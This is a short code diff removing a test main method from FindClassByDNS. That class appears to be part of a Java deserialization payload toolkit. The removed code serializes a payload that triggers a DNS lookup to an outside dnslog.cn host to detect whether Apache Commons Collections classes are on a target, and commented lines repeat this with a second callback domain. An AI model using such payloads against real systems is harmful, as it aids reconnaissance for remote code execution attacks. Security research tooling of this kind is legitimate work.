@@ -95,24 +95,4 @@ public class FindClassByDNS implements ObjectPayload<Object> {
                     return null;
             }
     }
-
-
-    public static void main(final String[] args) throws Exception {
-        //PayloadRunner.run(URLDNS1.class, args);
-        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("/tmp/transformer.ser"));
-        objectOutputStream.writeObject(new FindClassByDNS().getObject("http://cc.mfpy4t.dnslog.cn|org.apache.commons.collections.map.LazyMap"));
-        objectOutputStream.close();
-
-//        Map<Object,Object> linkedList = new HashMap<Object, Object>();
-//        Object url = new FindClassByDNS().getObject("http://wee11111.up3n9z.dnslog.cn");
-//        linkedList.put(makeClass("Okkkkkkkk"),url);
-//
-//
-//        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("transformer.ser"));
-//        objectOutputStream.writeObject(linkedList);
-//        objectOutputStream.close();
-
-//        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("transformer.ser"));
-//        objectInputStream.readObject();
-    }
 }
